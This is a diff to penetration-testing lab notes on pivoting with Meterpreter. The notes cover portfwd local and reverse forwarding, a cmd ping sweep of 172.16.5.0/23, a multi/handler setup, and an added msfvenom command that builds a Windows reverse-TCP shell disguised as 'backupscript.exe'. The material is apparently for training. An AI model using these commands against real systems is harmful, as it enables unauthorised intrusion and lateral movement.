@@ -3,6 +3,9 @@ Now let us consider a scenario where we have our Meterpreter shell access on the
 Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
 Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
 
+---
+
+
 
 ```
 use exploit/multi/handler
@@ -30,7 +33,7 @@ for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 ```
 ping sweep from cmd
 
-port forwarding
+## port forwarding
 ```
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 ```
@@ -52,4 +55,10 @@ command. This command forwards all connections on port `1234` running on the Ubu
 set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
 ```
-background the session
+background the session and set the correct payload
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
+
